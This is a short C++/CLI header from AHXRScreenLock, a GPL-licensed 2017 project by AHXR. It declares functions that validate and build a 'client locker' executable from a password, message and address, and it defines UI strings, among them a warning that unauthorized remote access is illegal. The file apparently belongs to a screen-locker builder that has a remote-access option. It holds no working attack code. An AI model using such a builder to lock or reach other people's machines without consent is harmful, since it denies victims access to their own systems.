/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
extern void validateClientBuild(System::String ^ message, System::String ^ password, System::Windows::Forms::SaveFileDialog ^ saveref, bool showDialog=true);
extern void createClientLocker(System::String ^ fileName, System::String ^ password, System::String ^ message, System::String ^ exe, System::String ^ address, bool exith=true);

#define ERROR_MSG_1			"Illegal Characters"
#define ERROR_MSG_2			"Please enter a message."
#define ERROR_MSG_3			"Please enter a password."
#define WARNING_MSG			"Warning: Unauthorized remote access to another computer is considered illegal in most cases. By toggling this on, you agree and take full responsbility for your actions."
#define COMPLETE_MSG		"Done."
#define	LOCKER_FILE_PATH	"AHXRLocker.exe"